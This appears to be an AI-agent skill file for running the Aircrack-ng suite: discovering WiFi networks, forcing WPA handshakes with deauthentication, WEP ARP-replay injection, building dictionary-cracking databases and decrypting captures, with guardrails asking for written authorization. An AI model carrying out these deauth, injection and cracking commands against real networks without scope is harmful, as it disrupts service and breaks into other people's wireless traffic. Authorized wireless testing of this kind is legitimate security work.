---
name: aircrack-ng
description: Orchestrate Aircrack-ng suite tools (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, airbase-ng, airdecap-ng, airolib-ng) for authorized wireless discovery, WPA/WEP capture, and crack workflows. Parse airodump CSV via TextFSM. Use for WiFi OSINT, monitor mode setup, handshake capture, or SpiderFeet WIFI_ACCESS_POINT nugget mapping.
---

# Aircrack-ng — Wireless Scanning and Analysis

## Purpose

Use when an agent must **discover, capture, and analyze WiFi networks** with the [Aircrack-ng](https://www.aircrack-ng.org/) suite on a **monitor-mode-capable** adapter, under **explicit authorization**, then parse results into structured records (airodump CSV → TextFSM → `WIFI_ACCESS_POINT` and related nuggets).

**Suite on this repo (Windows 1.7 extract):** `.tools/aircrack-ng/aircrack-ng-1.7-win/bin` — help captures **2026-08-10** in `.tmp_aircrack_help/`.

**Host facts (document honestly):**

| Component | This host |
|-----------|-----------|
| Live help | airodump-ng, aireplay-ng, airbase-ng, airdecap-ng, airolib-ng, airtun-ng, airserv-ng, airdecloak-ng, packetforge-ng, and other suite helpers in `.tmp_aircrack_help/` |
| **airmon-ng** | **Not in Windows zip** — Linux/WSL only |
| **aircrack-ng** (cracker) | Help capture failed (`The system cannot execute the specified program`) — **do not invent flags**; re-capture `aircrack-ng --help` on Linux |

## Step-by-Step Instructions

1. **Confirm authorization** — Written permission for the target airspace and physical location. Unauthorized wireless interception is illegal in most jurisdictions.
2. **Pick runtime** — Full monitor-mode workflows need **Linux/WSL** (`airmon-ng` + injection). Windows suite binaries can show help for many tools but cannot replace `airmon-ng`.
3. **Verify adapter** — USB WiFi with monitor mode + packet injection. On Linux: `iw dev` / `airmon-ng` to list interfaces.
4. **Kill conflicting processes** — `sudo airmon-ng check kill` (or `check` then manual stop).
5. **Enable monitor mode** — `sudo airmon-ng start wlan0` → note monitor iface (often `wlan0mon`).
6. **Discover networks** — `sudo airodump-ng wlan0mon` or write CSV: `airodump-ng -w capture --output-format csv,pcap wlan0mon` (flags from captured help).
7. **Focus target** — Note BSSID, channel, ESSID; lock with `--channel` / `--bssid` and `-w` prefix.
8. **Capture handshake (WPA/WPA2)** — Wait for client auth, or authorized deauth: `aireplay-ng --deauth 1 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon` (also `-0`).
9. **Crack (if in scope, Linux)** — Run `aircrack-ng` only after Linux help is available; do **not** invent Windows-missing flags. Prefer `airolib-ng` for PMK prep when wordlists are large.
10. **Parse output** — TextFSM on airodump `.csv` (see `output-and-parsing.md`).
11. **Teardown** — `sudo airmon-ng stop wlan0mon`; restore managed networking.

## If/Then Decision Rules

| If | Then |
|----|------|
| On Windows without WSL/monitor adapter | Document limitation; do not pretend `airmon-ng` exists in the zip |
| Need `aircrack-ng` flags | Re-capture on Linux — **never invent** from memory or wiki guesswork in CLI Options |
| No monitor-capable adapter | Stop — report hardware requirement |
| `airmon-ng check` shows NetworkManager/wpa_supplicant conflict | `check kill` or stop services before monitor mode |
| WPA network, no handshake after passive wait | Authorized test: targeted `--deauth` / `-0`; else continue passive or move on |
| WEP network (legacy) | IV collection + `--arpreplay` / `-3`; see workflows |
| Hidden ESSID | Capture probe responses; wait for client traffic; key on BSSID |
| Channel hopping misses AP | Fix channel with `--channel` on airodump |
| Multiple APs same ESSID | Disambiguate by BSSID in all commands |
| Need decrypted PCAP | `airdecap-ng -e <ESSID> -p <key> input.cap` after key recovered |
| Large WPA dictionary crack | Precompute PMKs: `airolib-ng` import/batch (Linux cracker for final step) |
| Only discovery (OSINT) | Stop after airodump CSV parse — no injection |

## Guardrails & Pitfalls

- **Authorized testing only** — Own lab, written pentest scope, or explicit SSID/BSSID allow-list.
- **Do not invent flags** — Source of truth is `.tmp_aircrack_help/` and `Aircrack-Ng-CLI-Options.md` Captured help. `aircrack-ng` cracker flags are **out of band** until Linux re-capture.
- **airmon-ng is Linux/WSL** — Absent from Windows 1.7 zip.
- **Compatible adapter required** — Built-in laptop WiFi often lacks monitor/injection. Verify with `aireplay-ng --test` / `-9` before disruptive work.
- **Deauth/disruptive attacks** — `--deauth` / `-0` denies service; only in scoped engagements.
- **Legal capture** — Recording third-party traffic without consent may violate wiretap laws.
- **Channel regulatory domain** — Stay within allowed frequencies.
- **CSV timing** — airodump CSV updates periodically; use `-w` / `--write-interval` consistently.
- **Do not crack by default in SpiderFeet OSINT** — Discovery/mapping is passive-friendly; cracking is operator opt-in.
- **WEP** — Deprecated; legacy lab assessments only.

## Strategies and Tactics

See [`references/tactics.md`](references/tactics.md) for adaptive sequences (discovery → focus → capture → crack → decrypt).

## References

Indexed in [`references/SKILLS.md`](references/SKILLS.md).

| File | Topic |
|------|--------|
| `cli-options-by-module.md` | Per-tool flags from captured help |
| `workflows.md` | WPA and WEP orchestration |
| `output-and-parsing.md` | airodump CSV TextFSM |
| `nugget-mapping.md` | WiFi findings → nuggets |
| `tactics.md` | Adaptive wireless sequences |
| `sources.md` | Official docs and tutorials |

Operator guides: `.docs/docs-for-cli-tools/Aircrack-Ng-Zero-to-Hero.md`, `Aircrack-Ng-CLI-Options.md`.

Help captures: `.tmp_aircrack_help/` — **2026-08-10**.

## Examples

Examples use **captured** airodump/aireplay/airdecap/airolib flags. Crack examples require Linux `aircrack-ng` after help re-capture.

### List interfaces and start monitor mode (Linux/WSL)

```bash
sudo airmon-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### Passive survey (all channels)

```bash
sudo airodump-ng wlan0mon
```

### Survey with CSV for parsing

```bash
sudo airodump-ng -w survey --output-format csv,pcap wlan0mon
# Produces survey-01.csv, survey-01.cap
```

### Lock AP and capture WPA handshake

```bash
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_handshake wlan0mon
# second terminal (authorized only):
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# equivalent short form: aireplay-ng -0 3 -a ... -c ...
```

### Injection test

```bash
sudo aireplay-ng --test wlan0mon
# short form: aireplay-ng -9 wlan0mon
```

### WEP IV capture + ARP replay

```bash
sudo airodump-ng --channel 1 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# short form: aireplay-ng -3 ...
# then crack on Linux with aircrack-ng (flags from Linux --help only)
```

### airolib-ng PMK database

```bash
airolib-ng pmk_db --import essid /tmp/essids.txt
airolib-ng pmk_db --import passwd /tmp/wordlist.txt
airolib-ng pmk_db --clean all
airolib-ng pmk_db --batch
# crack step: Linux aircrack-ng after help re-capture (do not invent -r / other flags here)
```

### Decrypt capture after key known

```bash
airdecap-ng -e "LabNetwork" -p "s3cretkey" encrypted.cap
```

### Stop monitor mode (Linux/WSL)

```bash
sudo airmon-ng stop wlan0mon
```
